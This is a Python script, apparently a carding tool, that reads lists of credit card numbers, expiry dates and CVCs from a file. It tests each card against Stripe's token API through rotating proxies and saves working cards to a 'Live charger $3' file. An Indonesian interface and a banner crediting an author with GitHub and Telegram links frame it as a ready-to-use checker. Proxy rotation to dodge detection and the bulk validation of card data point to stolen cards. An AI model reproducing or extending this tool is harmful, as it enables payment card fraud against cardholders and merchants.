import requests
import os
import logging
import time
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# Setup logging
logging.basicConfig(filename='vcc_checker.log', level=logging.INFO,
                    format='%(asctime)s:%(levelname)s:%(message)s')

# Constants
STRIPE_API_KEY = os.getenv('STRIPE_API_KEY')
API_URL = "https://api.stripe.com/v1/tokens"

# Function to check credit card
def check_credit_card(card_info, proxy=None):
    headers = {
        'Authorization': f'Bearer {STRIPE_API_KEY}',
        'Content-Type': 'application/x-www-form-urlencoded',
    }

    data = {
        'card[number]': card_info[0],
        'card[exp_month]': card_info[1],
        'card[exp_year]': card_info[2],
        'card[cvc]': card_info[3],
    }

    try:
        if proxy:
            response = requests.post(API_URL, headers=headers, data=data, proxies={"http": proxy, "https": proxy}, timeout=10)
        else:
            response = requests.post(API_URL, headers=headers, data=data, timeout=10)

        if response.status_code == 200:
            logging.info(f'Success: {card_info}')
            return True
        else:
            logging.error(f'Failed: {card_info} - {response.text}')
            return False

    except requests.exceptions.RequestException as e:
        logging.error(f'Error with {card_info} - {str(e)}')
        return False

# Function to read credit cards from file
def read_credit_cards(file_path):
    try:
        with open(file_path, 'r') as f:
            cards = [line.strip().split('|') for line in f.readlines()]
        return cards
    except Exception as e:
        print(f"Error reading file: {e}")
        return []

# Function to read proxies from file
def read_proxies(file_path):
    try:
        with open(file_path, 'r') as f:
            proxies = [line.strip() for line in f.readlines()]
        return proxies
    except Exception as e:
        print(f"Error reading file: {e}")
        return []

# Main function
def main():
    # Clear terminal screen
    os.system('clear')

    # Get file paths
    cc_file = input("Masukkan path file kartu (cc.txt): ")
    proxy_file = input("Masukkan path file proxy (proxy.txt) atau kosongkan jika tidak ingin menggunakan proxy: ")

    # Validate input files
    if not cc_file.endswith('.txt'):
        print("\033[91mFile kartu harus berformat .txt\033[0m")
        return

    if proxy_file and not proxy_file.endswith('.txt'):
        print("\033[91mFile proxy harus berformat .txt\033[0m")
        return

    # Read credit cards
    credit_cards = read_credit_cards(cc_file)

    # Validate credit card format
    for card in credit_cards:
        if len(card) != 4:
            print(f"\033[91mFormat kartu tidak valid: {card}\033[0m")
            return

    # Read proxies if provided
    proxies = read_proxies(proxy_file) if proxy_file else []

    # Check cards
    live_cards = []
    failed_cards = []

    for card in credit_cards:
        card_info = card  # card_info should be like [card_number, mm, yy, cvv]
        proxy = proxies.pop(0) if proxies else None  # Get proxy if available

        if check_credit_card(card_info, proxy):
            live_cards.append(card_info)
            print(f"\033[92mSuccess: {card_info}\033[0m")  # Green text for success
        else:
            failed_cards.append(card_info)
            print(f"\033[91mFailed: {card_info} - Proxy error/die\033[0m")  # Red text for failure

        # Rotate proxies
        if proxies:
            proxies.append(proxy)  # Put the used proxy back at the end

    # Save results to file
    with open('Live charger $3.txt', 'w') as f:
        for card in live_cards:
            f.write('|'.join(card) + '\n')

    with open('Failed charger $3.txt', 'w') as f:
        for card in failed_cards:
            f.write('|'.join(card) + '\n')

    print("Hasil berhasil disimpan di 'Live charger $3.txt' dan 'Failed charger $3.txt'")

if __name__ == "__main__":
    # Clear terminal screen
    os.system('clear')

    # Add ASCII Art Header
    print("""
    ███████╗ ██████╗  ██████╗ ███████╗
    ██╔════╝██╔═══██╗██╔════╝ ██╔════╝
    █████╗  ██║   ██║██║  ███╗███████╗
    ██╔══╝  ██║   ██║██║   ██║╚════██║
    ██║     ╚██████╔╝╚██████╔╝███████║
    ╚═╝      ╚═════╝  ╚═════╝ ╚══════╝
    Author: Mh. Taufiq Hidayatulloh
    Github: https://github.com/taufiqdayat211
    Telegram: https://t.me/aswggg77
    """)
    
    main()
